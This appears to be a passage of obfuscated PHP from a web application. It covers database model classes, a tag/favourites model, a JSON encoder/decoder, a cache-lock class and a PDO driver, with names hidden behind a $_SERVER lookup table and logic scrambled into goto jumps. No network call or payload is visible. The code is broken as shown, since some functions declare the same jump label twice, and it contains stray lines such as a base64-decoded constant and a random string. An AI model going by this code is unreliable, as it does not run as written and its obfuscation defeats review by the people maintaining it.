(empty($a䵋Ĥ)) { $this->error = $c[77]($c[1023]); return !1; } $dƖ = $this->{$_SERVER[拘][1024]}($dƖ); foreach ($a䵋Ĥ as $Fꥍ => $A؈) { $a䵋Ĥ[$Fꥍ] = $this->{$_SERVER[拘][1025]}($A؈); $this->{$_SERVER[拘][1026]}($a䵋Ĥ[$Fꥍ], $dƖ); } goto dɏ; dɏ: if ($c[89]($this->db, $c[1031])) { for ($e񱒂 = 0; $e񱒂 < $c[37]($a䵋Ĥ); $e񱒂 += $a瘲) { $Dϲ = $c[524]($a䵋Ĥ, $e񱒂, $a瘲); if (!$c[93]($Dϲ) || $c[37]($Dϲ) == 0) { break; } $f = $this->db->{$_SERVER[拘][1032]}($Dϲ, $dƖ, $A); } } else { $this->{$_SERVER[拘][1033]}(); foreach ($a䵋Ĥ as $Fꥍ => $A؈) { $f = $this->db->{$_SERVER[拘][1027]}($A؈, $dƖ, $A); } $this->{$_SERVER[拘][1034]}(); } if (!1 !== $f) { $dթ = $this->{$_SERVER[拘][1028]}(); if ($dթ) { return $dթ; } } return $f; goto F; EۖҴ: $c =& $_SERVER[拘]; $c[376](); $a瘲 = self::SQL_WHERE_IN_CHUNK; goto Aڒ; F: } public function save($bϷ = '', $Eަ = array()) { goto B߆; E: $Dу = $b᡼[$dޱ[251]][$C圦][1]; $DÅ = $dޱ[37]($Dу); for ($Aƶ = 0; $Aƶ < $DÅ; $Aƶ += $e╈̅) { $A = $dޱ[524]($Dу, $Aƶ, $e╈̅); if (!$dޱ[93]($A) || $dޱ[37]($A) == 0) { break; } $b᡼[$dޱ[251]][$C圦][1] = $A; $this->{$_SERVER[拘][1151]}($b᡼); $D += parent::save($bϷ, $Eަ); } goto Eݿ; B߆: $dޱ =& $_SERVER[拘]; $e╈̅ = self::SQL_WHERE_IN_CHUNK; $b᡼ = $this->{$_SERVER[拘][1151]}(); goto bछ; bछ: $C圦 = $this->{$_SERVER[拘][1170]}($b᡼); if (!$C圦) { return parent::save($bϷ, $Eަ); } $D = 0; goto E; Eݿ: return $D; goto Cޏ; Cޏ: } public function add($Eч = '', $aպ = array(), $C = false) { if ($this->addTaskStatus && $_SERVER[拘][93]($Eч)) { $this->addTaskData[] = $Eч; return; } return parent::add($Eч, $aպ, $C); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->{$_SERVER[拘][1161]}($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($c = array()) { goto Bꎉ; EќӖ: $eէ = null; for ($f = 0; $f < $d֏[37]($A๰̽); $f += $Cǥ) { $f䎥 = $d֏[524]($A๰̽, $f, $Cǥ); if (!$d֏[93]($f䎥) || $d֏[37]($f䎥) == 0) { break; } $D亅ه[$d֏[251]][$b얠][1] = $f䎥; $this->{$_SERVER[拘][1151]}($D亅ه); $FږӺ = parent::select($c); if (!$FږӺ) { continue; } if ($d֏[149]($eէ)) { $eէ = array(); } $eէ = $d֏[153]($eէ, $FږӺ); } return $eէ; goto E˶; Bꎉ: $d֏ =& $_SERVER[拘]; $Cǥ = self::SQL_WHERE_IN_CHUNK; $D亅ه = $this->{$_SERVER[拘][1151]}(); goto Bм; Bм: $b얠 = $this->{$_SERVER[拘][1170]}($D亅ه); if (!$b얠 || isset($D亅ه[$d֏[255]]) || isset($D亅ه[$d֏[261]])) { return parent::select($c); } $A๰̽ = $D亅ه[$d֏[251]][$b얠][1]; goto EќӖ; E˶: } public function delete($EƅĆ = array()) { goto A񏌰; aɉ되: $Aŭ = $this->{$_SERVER[拘][1170]}($f); if (!$Aŭ) { return parent::delete($EƅĆ); } $aۤߊ = 0; goto f; A񏌰: $e荵 =& $_SERVER[拘]; $E = self::SQL_WHERE_IN_CHUNK; $f = $this->{$_SERVER[拘][1151]}(); goto aɉ되; f: $E = $f[$e荵[251]][$Aŭ][1]; for ($cϐ = 0; $cϐ < $e荵[37]($E); $cϐ += $E) { $A蓿 = $e荵[524]($E, $cϐ, $E); if (!$e荵[93]($A蓿) || $e荵[37]($A蓿) == 0) { break; } $f[$e荵[251]][$Aŭ][1] = $A蓿; $this->{$_SERVER[拘][1151]}($f); $aۤߊ += parent::delete($EƅĆ); } return $aۤߊ; goto D; D: } private function findWhereField($c㊇) { $D =& $_SERVER[拘]; $b = self::SQL_WHERE_IN_CHUNK; if (!$D[93]($c㊇) || !$D[93]($c㊇[$D[251]])) { return !1; } foreach ($c㊇[$D[251]] as $B㰧呺 => $fˌ) { if ($D[93]($fˌ) && isset($fˌ[0]) && $D[80]($fˌ[0]) == $D[359] && $D[93]($fˌ[1]) && $D[37]($fˌ[1]) > $b) { $D[376](); return $B㰧呺; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\x74\x65\x6d\x4f\x70\164\x69\x6f\x6e"; public $field = array(); public function listData($c拙 = false, $Fמ = "\155\157\x64\151\x66\171\124\151\155\145", $b뭛Џ = false) { $cו =& $_SERVER[拘]; $f̓ = $cו[64]($this->modelType)->{$_SERVER[拘][59]}(!1, $this->optionType, !0); if (!$c拙) { $f̓ = $cו[442]($f̓); return $cו[1171]($f̓, $Fמ, $b뭛Џ); } return $f̓[$cו[1172] . $c拙]; } public function insert($f) { goto bߐ; bߐ: $Bɽϐ =& $_SERVER[拘]; $f = $Bɽϐ[1173]($f, $this->field); $aɪ = $Bɽϐ[64]($this->modelType)->{$_SERVER[拘][59]}($Bɽϐ[1174], $this->optionType . $Bɽϐ[1175]); goto E֎ͬ; C: return $aɪ; goto bϕ; dͫ: $f[$Bɽϐ[559]] = $Bɽϐ[50](); $Bɽϐ[64]($this->modelType)->{$_SERVER[拘][61]}($Bɽϐ[1174], $aɪ, $this->optionType . $Bɽϐ[1175]); $Bɽϐ[64]($this->modelType)->{$_SERVER[拘][61]}($Bɽϐ[1172] . $aɪ, $f, $this->optionType); goto C; E֎ͬ: $aɪ = $aɪ ? $aɪ : 0; $f[$Bɽϐ[414]] = ++$aɪ; $f[$Bɽϐ[558]] = $Bɽϐ[50](); goto dͫ; bϕ: } public function update($E, $A) { goto dݶ; dݶ: $dò =& $_SERVER[拘]; $A = $dò[1173]($A, $this->field); $Cܧ = $this->{$_SERVER[拘][504]}($E); goto f; f: return $dò[64]($this->modelType)->{$_SERVER[拘][61]}($dò[1172] . $E, $A, $this->optionType); goto aՓʧ; f: if (!$Cܧ) { return !1; } $A = $dò[153]($Cܧ, $A); $A[$dò[559]] = $dò[50](); goto f; aՓʧ: } public function remove($c) { $dଵ =& $_SERVER[拘]; return $dଵ[64]($this->modelType)->{$_SERVER[拘][62]}($dଵ[1172] . $c, $this->optionType); } public function clear() { $d =& $_SERVER[拘]; $d[64]($this->modelType)->{$_SERVER[拘][62]}($d[1174], $this->optionType . $d[1175]); return $d[64]($this->modelType)->{$_SERVER[拘][62]}(null, $this->optionType); } public function findByKey($bȖ, $A) { if (!$A) { return !1; } $E = $this->{$_SERVER[拘][504]}(); $E = $_SERVER[拘][413]($E, $bȖ); return isset($E[$A]) ? $E[$A] : !1; } public function findByName($eɇϻ) { return $this->{$_SERVER[拘][1176]}($_SERVER[拘][375], $eɇϻ); } protected function resetData($A՘) { $FҞɃƨ =& $_SERVER[拘]; $eŨ = array(); for ($F = 0; $F < $FҞɃƨ[37]($A՘); $F++) { $eŨ[$FҞɃƨ[1172] . $A՘[$F][$FҞɃƨ[414]]] = $A՘[$F]; } return $FҞɃƨ[64]($this->modelType)->{$_SERVER[拘][61]}($eŨ, !1, $this->optionType); } private function getAutoName($d) { $Aǧ =& $_SERVER[拘]; $Ańܓݳ = $Aǧ[413](parent::listData(), $Aǧ[375]); if (!$Ańܓݳ || !isset($Ańܓݳ[$d])) { return $d; } for ($FӠ = 1; $FӠ < $Aǧ[37]($Ańܓݳ); $FӠ++) { $dҤ = $d . "\x28{$FӠ}\x29"; if (!isset($Ańܓݳ[$dҤ])) { return $dҤ; } } return $dҤ; } } goto cԛ; cߍӘ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($B庤з) { $cޟ =& $_SERVER[拘]; return array($cޟ[1443] => array(USER_ID, $cޟ[1444])); } protected function listData() { $e =& $_SERVER[拘]; $DćƉ = array($e[1445] => USER_ID, $e[1446] => array($e[1447], 0)); $D = $e[1448]; $B = $e[1449]; $f = $this->{$_SERVER[拘][1164]}($D)->{$_SERVER[拘][501]}($DćƉ)->{$_SERVER[拘][1450]}($B)->{$_SERVER[拘][1042]}(); return $f ? $f : array(); } protected function listByTag($aҕ) { } protected function addToTag($aÂ, $bŇ) { $a =& $_SERVER[拘]; if (!$a[64]($a[1451])->{$_SERVER[拘][504]}($bŇ) || !$a[64]($a[474])->{$_SERVER[拘][495]}($aÂ)) { return !1; } $e = array($a[1445] => USER_ID, $a[1446] => $bŇ, $a[1452] => $aÂ, $a[445] => $a[1354], $a[1453] => $a[67], $a[1454] => 0); if ($this->{$_SERVER[拘][501]}($e)->{$_SERVER[拘][502]}()) { return !1; } return $this->{$_SERVER[拘][63]}($e); } protected function removeFromTag($f, $aꦺ) { $bե =& $_SERVER[拘]; $aъҶ = array($bե[1445] => USER_ID, $bե[1446] => $aꦺ, $bե[1452] => $f); return $this->{$_SERVER[拘][501]}($aъҶ)->{$_SERVER[拘][308]}(); } protected function removeByTag($E) { $b =& $_SERVER[拘]; if (!$E) { return !1; } $Bˢ = array($b[1445] => USER_ID, $b[1446] => $E); return $this->{$_SERVER[拘][501]}($Bˢ)->{$_SERVER[拘][308]}(); } protected function removeBySource($d) { $Bˊ =& $_SERVER[拘]; $A֤ = array($Bˊ[1445] => USER_ID, $Bˊ[1452] => $d, $Bˊ[1446] => array($Bˊ[200], 0)); return $this->{$_SERVER[拘][501]}($A֤)->{$_SERVER[拘][308]}(); } } $_SERVER[拘][0]($_SERVER[拘][1455], $_SERVER[拘][1456]); $_SERVER[$_SERVER[拘][1457]] = $_SERVER[拘][4]($_SERVER[拘][1458], $_SERVER[拘][6]($_SERVER[拘][7]($_SERVER[拘][1459], 10, -8))); goto a; b쓊: $_SERVER[拘][0]($_SERVER[拘][2137], 16); $_SERVER[拘][0]($_SERVER[拘][2138], 32); class Services_JSON { function __construct($F揼 = 0) { $this->use = $F揼; } function utf162utf8($D) { $Dբ =& $_SERVER[拘]; if ($Dբ[534]($Dբ[624])) { return $Dբ[625]($D, $Dբ[2139], $Dբ[2140]); } $E = $Dբ[2109]($D[0]) << 8 | $Dբ[2109]($D[1]); switch (!0) { case (127 & $E) == $E: return $Dբ[2111](127 & $E); case (2047 & $E) == $E: return $Dբ[2111](192 | $E >> 6 & 31) . $Dբ[2111](128 | $E & 63); case (65535 & $E) == $E: return $Dբ[2111](224 | $E >> 12 & 15) . $Dբ[2111](128 | $E >> 6 & 63) . $Dբ[2111](128 | $E & 63); } return $Dբ[67]; } function utf82utf16($cƳ) { $cƌ =& $_SERVER[拘]; if ($cƌ[534]($cƌ[624])) { return $cƌ[625]($cƳ, $cƌ[2140], $cƌ[2139]); } switch ($cƌ[195]($cƳ)) { case 1: return $cƳ; case 2: return $cƌ[2111](7 & $cƌ[2109]($cƳ[0]) >> 2) . $cƌ[2111](192 & $cƌ[2109]($cƳ[0]) << 6 | 63 & $cƌ[2109]($cƳ[1])); case 3: return $cƌ[2111](240 & $cƌ[2109]($cƳ[0]) << 4 | 15 & $cƌ[2109]($cƳ[1]) >> 2) . $cƌ[2111](192 & $cƌ[2109]($cƳ[1]) << 6 | 127 & $cƌ[2109]($cƳ[2])); } return $cƌ[67]; } function encode($a) { $eυ =& $_SERVER[拘]; switch ($eυ[2141]($a)) { case $eυ[2142]: return $a ? $eυ[2143] : $eυ[2144]; case $eυ[2145]: return $eυ[164]; case $eυ[1088]: return (int) $a; case $eυ[1051]: case $eυ[1050]: return (double) $a; case $eυ[1098]: $cꉘγ = $eυ[67]; $dꏥ = $eυ[195]($a); for ($A = 0; $A < $dꏥ; ++$A) { $F = $eυ[2109]($a[$A]); switch (!0) { case $F == 8: $cꉘγ .= $eυ[2146]; break; case $F == 9: $cꉘγ .= $eυ[2147]; break; case $F == 10: $cꉘγ .= $eυ[2148]; break; case $F == 12: $cꉘγ .= $eυ[2149]; break; case $F == 13: $cꉘγ .= $eυ[2150]; break; case $F == 34: case $F == 47: case $F == 92: $cꉘγ .= $eυ[338] . $a[$A]; break; case $F >= 32 && $F <= 127: $cꉘγ .= $a[$A]; break; case ($F & 224) == 192: $b߅׸ = $eυ[2151]($eυ[2152], $F, $eυ[2109]($a[$A + 1])); $A += 1; $bӫȺ = $this->{$_SERVER[拘][2153]}($b߅׸); $cꉘγ .= $eυ[596]($eυ[2154], $eυ[2155]($bӫȺ)); break; case ($F & 240) == 224: $b߅׸ = $eυ[2151]($eυ[2152], $F, $eυ[2109]($a[$A + 1]), $eυ[2109]($a[$A + 2])); $A += 2; $bӫȺ = $this->{$_SERVER[拘][2153]}($b߅׸); $cꉘγ .= $eυ[596]($eυ[2154], $eυ[2155]($bӫȺ)); break; case ($F & 248) == 240: $b߅׸ = $eυ[2151]($eυ[2152], $F, $eυ[2109]($a[$A + 1]), $eυ[2109]($a[$A + 2]), $eυ[2109]($a[$A + 3])); $A += 3; $bӫȺ = $this->{$_SERVER[拘][2153]}($b߅׸); $cꉘγ .= $eυ[596]($eυ[2154], $eυ[2155]($bӫȺ)); break; case ($F & 252) == 248: $b߅׸ = $eυ[2151]($eυ[2152], $F, $eυ[2109]($a[$A + 1]), $eυ[2109]($a[$A + 2]), $eυ[2109]($a[$A + 3]), $eυ[2109]($a[$A + 4])); $A += 4; $bӫȺ = $this->{$_SERVER[拘][2153]}($b߅׸); $cꉘγ .= $eυ[596]($eυ[2154], $eυ[2155]($bӫȺ)); break; case ($F & 254) == 252: $b߅׸ = $eυ[2151]($eυ[2152], $F, $eυ[2109]($a[$A + 1]), $eυ[2109]($a[$A + 2]), $eυ[2109]($a[$A + 3]), $eυ[2109]($a[$A + 4]), $eυ[2109]($a[$A + 5])); $A += 5; $bӫȺ = $this->{$_SERVER[拘][2153]}($b߅׸); $cꉘγ .= $eυ[596]($eυ[2154], $eυ[2155]($bӫȺ)); break; } } return $eυ[652] . $cꉘγ . $eυ[652]; case $eυ[2156]: if ($eυ[93]($a) && $eυ[37]($a) && $eυ[766]($a) !== $eυ[2110](0, $eυ[2157]($a) - 1)) { $DЫ = $eυ[159](array($this, $eυ[2158]), $eυ[766]($a), $eυ[442]($a)); foreach ($DЫ as $E֝﬒) { if (Services_JSON::isError($E֝﬒)) { return $E֝﬒; } } return $eυ[448] . $eυ[353]($eυ[119], $DЫ) . $eυ[449]; } $cᛉ = $eυ[159](array($this, $eυ[2160]), $a); foreach ($cᛉ as $dϏ) { if (Services_JSON::isError($dϏ)) { return $dϏ; } } return $eυ[2161] . $eυ[353]($eυ[119], $cᛉ) . $eυ[2162]; case $eυ[2163]: $BԎ = $eυ[1066]($a); $DЫ = $eυ[159](array($this, $eυ[2158]), $eυ[766]($BԎ), $eυ[442]($BԎ)); foreach ($DЫ as $E֝﬒) { if (Services_JSON::isError($E֝﬒)) { return $E֝﬒; } } return $eυ[448] . $eυ[353]($eυ[119], $DЫ) . $eυ[449]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $eυ[164] : new Services_JSON_Error($eυ[2141]($a) . $eυ[2165]); } } function name_value($E߃, $c矉쏑) { $c̛ =& $_SERVER[拘]; $d̑ = $this->{$_SERVER[拘][1487]}($c矉쏑); if (Services_JSON::isError($d̑)) { return $d̑; } return $this->{$_SERVER[拘][1487]}($c̛[2166]($E߃)) . $c̛[91] . $d̑; } function reduce_string($Fޗ) { $Aޯ =& $_SERVER[拘]; $Fޗ = $Aޯ[216](array($Aޯ[2167], $Aޯ[2168], $Aޯ[2169]), $Aޯ[67], $Fޗ); return $Aޯ[70]($Fޗ); } function decode($EЕ̲) { $c =& $_SERVER[拘]; $EЕ̲ = $this->{$_SERVER[拘][2170]}($EЕ̲); switch ($c[80]($EЕ̲)) { case $c[2143]: return !0; case $c[2144]: return !1; case $c[164]: return null; default: $Fҙߖ = array(); if ($c[68]($EЕ̲)) { return (double) $EЕ̲ == (int) $EЕ̲ ? (int) $EЕ̲ : (double) $EЕ̲; } elseif ($c[131]($c[2171], $EЕ̲, $Fҙߖ) && $Fҙߖ[1] == $Fҙߖ[2]) { $Až = $c[7]($EЕ̲, 0, 1); $d͇ = $c[7]($EЕ̲, 1, -1); $Cѓ = $c[67]; $DŻ = $c[195]($d͇); for ($c = 0; $c < $DŻ; ++$c) { $bڪ = $c[7]($d͇, $c, 2); $Bϰ = $c[2109]($d͇[$c]); switch (!0) { case $bڪ == $c[2146]: $Cѓ .= $c[2111](8); ++$c; break; case $bڪ == $c[2147]: $Cѓ .= $c[2111](9); ++$c; break; case $bڪ == $c[2148]: $Cѓ .= $c[2111](10); ++$c; break; case $bڪ == $c[2149]: $Cѓ .= $c[2111](12); ++$c; break; case $bڪ == $c[2150]: $Cѓ .= $c[2111](13); ++$c; break; case $bڪ == $c[1400]: case $bڪ == $c[2172]: case $bڪ == $c[2173]: case $bڪ == $c[2174]: if ($Až == $c[652] && $bڪ != $c[2172] || $Až == $c[1206] && $bڪ != $c[1400]) { $Cѓ .= $d͇[++$c]; } break; case $c[131]($c[2175], $c[7]($d͇, $c, 6)): $A鰔̝ = $c[2111]($c[2176]($c[7]($d͇, $c + 2, 2))) . $c[2111]($c[2176]($c[7]($d͇, $c + 4, 2))); $Cѓ .= $this->{$_SERVER[拘][2177]}($A鰔̝); $c += 5; break; case $Bϰ >= 32 && $Bϰ <= 127: $Cѓ .= $d͇[$c]; break; case ($Bϰ & 224) == 192: $Cѓ .= $c[7]($d͇, $c, 2); ++$c; break; case ($Bϰ & 240) == 224: $Cѓ .= $c[7]($d͇, $c, 3); $c += 2; break; case ($Bϰ & 248) == 240: $Cѓ .= $c[7]($d͇, $c, 4); $c += 3; break; case ($Bϰ & 252) == 248: $Cѓ .= $c[7]($d͇, $c, 5); $c += 4; break; case ($Bϰ & 254) == 252: $Cѓ .= $c[7]($d͇, $c, 6); $c += 5; break; } } return $Cѓ; } elseif ($c[131]($c[2178], $EЕ̲) || $c[131]($c[2179], $EЕ̲)) { goto c֎ԕ; aޅ: $d͇ = $this->{$_SERVER[拘][2170]}($d͇); if ($d͇ == $c[67]) { if ($c[1065]($EփǨ) == SERVICES_JSON_IN_ARR) { return $D; } else { return $dߦٌ; } } $DŻ = $c[195]($d͇); goto Aɋ; c֎ԕ: if ($EЕ̲[0] == $c[2161]) { $EփǨ = array(SERVICES_JSON_IN_ARR); $D = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $EփǨ = array(SERVICES_JSON_IN_OBJ); $dߦٌ = array(); } else { $EփǨ = array(SERVICES_JSON_IN_OBJ); $dߦٌ = new stdClass(); } } $c[1419]($EփǨ, array($c[2181] => SERVICES_JSON_SLICE, $c[251] => 0, $c[2182] => !1)); $d͇ = $c[7]($EЕ̲, 1, -1); goto aޅ; Aɋ: for ($c = 0; $c <= $DŻ; ++$c) { $a̵ = $c[1422]($EփǨ); $bڪ = $c[7]($d͇, $c, 2); if ($c == $DŻ || $d͇[$c] == $c[119] && $a̵[$c[2181]] == SERVICES_JSON_SLICE) { $a = $c[7]($d͇, $a̵[$c[251]], $c - $a̵[$c[251]]); $c[1419]($EփǨ, array($c[2181] => SERVICES_JSON_SLICE, $c[251] => $c + 1, $c[2182] => !1)); if ($c[1065]($EփǨ) == SERVICES_JSON_IN_ARR) { $c[1419]($D, $this->{$_SERVER[拘][1486]}($a)); } elseif ($c[1065]($EփǨ) == SERVICES_JSON_IN_OBJ) { $B嵎 = array(); if ($c[131]($c[2183], $a, $B嵎)) { $aׅ = $this->{$_SERVER[拘][1486]}($B嵎[1]); $DȚ = $this->{$_SERVER[拘][1486]}($B嵎[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $dߦٌ[$aׅ] = $DȚ; } else { $dߦٌ->{$aׅ} = $DȚ; } } elseif ($c[131]($c[2184], $a, $B嵎)) { $aׅ = $B嵎[1]; $DȚ = $this->{$_SERVER[拘][1486]}($B嵎[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $dߦٌ[$aׅ] = $DȚ; } else { $dߦٌ->{$aׅ} = $DȚ; } } } } elseif (($d͇[$c] == $c[652] || $d͇[$c] == $c[1206]) && $a̵[$c[2181]] != SERVICES_JSON_IN_STR) { $c[1419]($EփǨ, array($c[2181] => SERVICES_JSON_IN_STR, $c[251] => $c, $c[2182] => $d͇[$c])); } elseif ($d͇[$c] == $a̵[$c[2182]] && $a̵[$c[2181]] == SERVICES_JSON_IN_STR && ($c[195]($c[7]($d͇, 0, $c)) - $c[195]($c[43]($c[7]($d͇, 0, $c), $c[338]))) % 2 != 1) { $c[1932]($EփǨ); } elseif ($d͇[$c] == $c[2161] && $c[176]($a̵[$c[2181]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { $c[1419]($EփǨ, array($c[2181] => SERVICES_JSON_IN_ARR, $c[251] => $c, $c[2182] => !1)); } elseif ($d͇[$c] == $c[2162] && $a̵[$c[2181]] == SERVICES_JSON_IN_ARR) { $c[1932]($EփǨ); } elseif ($d͇[$c] == $c[448] && $c[176]($a̵[$c[2181]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { $c[1419]($EփǨ, array($c[2181] => SERVICES_JSON_IN_OBJ, $c[251] => $c, $c[2182] => !1)); } elseif ($d͇[$c] == $c[449] && $a̵[$c[2181]] == SERVICES_JSON_IN_OBJ) { $c[1932]($EփǨ); } elseif ($bڪ == $c[2185] && $c[176]($a̵[$c[2181]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { $c[1419]($EփǨ, array($c[2181] => SERVICES_JSON_IN_CMT, $c[251] => $c, $c[2182] => !1)); $c++; } elseif ($bڪ == $c[2186] && $a̵[$c[2181]] == SERVICES_JSON_IN_CMT) { $c[1932]($EփǨ); $c++; for ($d = $a̵[$c[251]]; $d <= $c; ++$d) { $d͇ = $c[2187]($d͇, $c[168], $d, 1); } } } if ($c[1065]($EփǨ) == SERVICES_JSON_IN_ARR) { return $D; } elseif ($c[1065]($EփǨ) == SERVICES_JSON_IN_OBJ) { return $dߦٌ; } goto d݋Η; d݋Η: } } } function isError($f處, $dΤ = null) { $b =& $_SERVER[拘]; if ($b[82]($b[2188])) { return PEAR::isError($f處, $dΤ); } elseif ($b[296]($f處) && ($b[627]($f處) == $b[2189] || $b[2190]($f處, $b[2189]))) { return !0; } return !1; } } goto E; A߫: $_SERVER[$_SERVER[$_SERVER[拘][3]][66]] = $_SERVER[$_SERVER[拘][3]][67]($_SERVER[$_SERVER[$_SERVER[拘][3]][64]]); $_SERVER[$_SERVER[$_SERVER[拘][3]][68]] = (base64_decode('NzQxNw==')."\x36\x30")+0;$_KnDv="iFgSVrYkcuViWy3aMrfVh4XwBnqH3z2jY5yd9TtyAyP8qAEzV";; class CacheLock { protected static $handle; protected static $timeout; protected static $lockItem = array(); public static function init() { goto D׌磊; A·䉈: self::$timeout = $Cז[$a̳[13]] ? $Cז[$a̳[13]] : 10; $bء = $GLOBALS[$a̳[11]][$a̳[14]][$a̳[15]]; if ($Cז[$a̳[16]] == $a̳[14] && $bء == $a̳[17]) { $Cז[$a̳[16]] = $a̳[18]; } goto cڼߎ; D׌磊: $a̳ =& $_SERVER[拘]; if (self::$handle) { return self::$handle; } $Cז = $GLOBALS[$a̳[11]][$a̳[12]]; goto A·䉈; cڼߎ: switch ($Cז[$a̳[16]]) { case $a̳[19]: self::$handle = new CacheLockRedis(); break; case $a̳[21]: self::$handle = new CacheLockMemcached(); break; case $a̳[14]: self::$handle = new CacheLockDatabase(); break; case $a̳[18]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto e; e: } private static function key($b櫚) { return $_SERVER[拘][25] . Cache::key($b櫚); } public static function initReset() { self::$handle = !1; } public static function lockGlobal($e, $f) { return self::lock($e, $f, !0); } public static function lock($f¸, $fؒԄ = false, $A۴ʺ = false) { goto F̋; A򂛐: $DҞ = $aد->{$_SERVER[拘][27]}($f¸, $fؒԄ); if (!$DҞ) { $_SERVER[拘][29]("\114\157\x63\153\40\141\143\164\x69\x6f\x6e\x3a\40{$f¸}\x20\x74\x69\x6d\145\x6f\x75\164\54\x6f\166\145\162\x20{$fؒԄ}\40\163", !1); } if (!$A۴ʺ) { self::$lockItem[$f¸] = !0; } goto f؈; F̋: $aد = self::init(); $f¸ = self::key($f¸); $fؒԄ = $fؒԄ ? $fؒԄ : self::$timeout; goto A򂛐; f؈: return $DҞ; goto Cޏ; Cޏ: } public static function unlock($d͘) { $d͘ = self::key($d͘); self::$lockItem[$d͘] = null; return self::init()->{$_SERVER[拘][30]}($d͘); } public static function unlockRuntime() { $C릪 = self::$lockItem; $eߏ = self::init(); foreach ($C릪 as $EԅÉ => $E) { if ($E) { $eߏ->{$_SERVER[拘][30]}($EԅÉ); } } } } goto a; cԛ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($AԢ = '') { $e՜ =& $_SERVER[拘]; if (!$e՜[82]($e՜[1177])) { $e՜[76]($e՜[77]($e՜[1178]) . $e՜[1179]); } if (!empty($AԢ)) { $this->config = $AԢ; if (empty($this->config[$e՜[106]])) { $this->config[$e՜[106]] = array(); } } } public function connect($B愓 = '', $c҃ = 0) { $eֶ =& $_SERVER[拘]; if (!isset($this->linkID[$c҃])) { goto f١ߙ; B⦥: $this->dbType = $this->{$_SERVER[拘][85]}($B愓[$eֶ[86]]); if ($eֶ[176]($this->dbType, array($eֶ[1182], $eֶ[142], $eֶ[1183], $eֶ[1184]))) { $eֶ[76]($eֶ[1185] . $this->dbType . $eֶ[1186] . $this->dbType . $eֶ[1187]); } if (!$this->linkID[$c҃]) { $eֶ[76]($eֶ[1188]); } goto cˤ; f١ߙ: if (empty($B愓)) { $B愓 = $this->config; } if ($this->pconnect) { $B愓[$eֶ[106]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$c҃] = new PDO($B愓[$eֶ[86]], $B愓[$eֶ[96]], $B愓[$eֶ[98]], $B愓[$eֶ[106]]); } catch (PDOException $c웳) { $eֶ[76]($c웳->{$_SERVER[拘][1181]}()); } goto B⦥; cˤ: $this->linkID[$c҃]->{$_SERVER[拘][1189]}($eֶ[1190] . $eֶ[108]($eֶ[1191])); $this->connected = !0; if (1 != $eֶ[108]($eֶ[116])) { unset($this->config); } goto b; b: } return $this->linkID[$c҃]; } public function free() { $this->PDOStatement = null; } public function query($Eۺ, $A˩ = array()) { goto fŷ; fŷ: $B =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!1); if (!$this->_linkID) { return !1; } goto A; CȒԎ: if (!1 === $this->PDOStatement) { $B[76]($this->{$_SERVER[拘][1199]}()); } $d = $this->PDOStatement->{$_SERVER[拘][245]}($A˩); $this->{$_SERVER[拘][1200]}(); goto cŻò; dߐ: $B[1196]($B[1197], 1); $B[135]($B[139]); $this->PDOStatement = $this->_linkID->{$_SERVER[拘][1198]}($Eۺ); goto CȒԎ; A: $this->queryStr = $Eۺ; if (!empty($A˩)) { $this->queryStr .= $B[1193] . $B[1194]($A˩, !0) . $B[1195]; } if (!empty($this->PDOStatement)) { $this->{$_SERVER[拘][290]}(); } goto dߐ; cŻò: if (!1 === $d) { $this->{$_SERVER[拘][1199]}(); return !1; } else { return $this->{$_SERVER[拘][1201]}(); } goto aڭ; aڭ: } public function execute($C𵠓, $a = array()) { goto E; E: $this->queryStr = $C𵠓; if (!empty($a)) { $this->queryStr .= $e[1193] . $e[1194]($a, !0) . $e[1195]; } $c᜞ = !1; goto eȇ; Cė: $Cۻ = $this->PDOStatement->{$_SERVER[拘][245]}($a); $this->{$_SERVER[拘][1200]}(); if (!1 === $Cۻ) { $this->{$_SERVER[拘][1199]}(); return !1; } else { $this->numRows = $this->PDOStatement->{$_SERVER[拘][1208]}(); if ($c᜞ || $e[131]($e[1209], $C𵠓)) { $this->lastInsID = $this->{$_SERVER[拘][1210]}(); } return $this->numRows; } goto B; d៊: $e[135]($e[139]); $this->PDOStatement = $this->_linkID->{$_SERVER[拘][1198]}($C𵠓); if (!1 === $this->PDOStatement) { $e[76]($this->{$_SERVER[拘][1199]}()); } goto Cė; E: $e =& $_SERVER[拘]; $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } goto E; eȇ: if ($this->dbType == $e[1184]) { if ($e[131]($e[1202], $this->queryStr, $FЈ)) { $this->table = $e[108]($e[1203]) . $e[1204]($e[108]($e[218]), $e[1168], $FЈ[2]); $c᜞ = (bool) $this->{$_SERVER[拘][260]}($e[1205] . $e[84]($this->table) . $e[1206]); } } if (!empty($this->PDOStatement)) { $this->{$_SERVER[拘][290]}(); } $e[1196]($e[1207], 1); goto d៊; B: } public function startTrans() { $this->{$_SERVER[拘][1192]}(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->{$_SERVER[拘][1211]}(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A˻ = $this->_linkID->{$_SERVER[拘][1034]}(); $this->transTimes = 0; if (!$A˻) { $this->{$_SERVER[拘][1199]}(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $d˄ԋ = $this->_linkID->{$_SERVER[拘][1129]}(); $this->transTimes = 0; if (!$d˄ԋ) { $this->{$_SERVER[拘][1199]}(); return !1; } } return 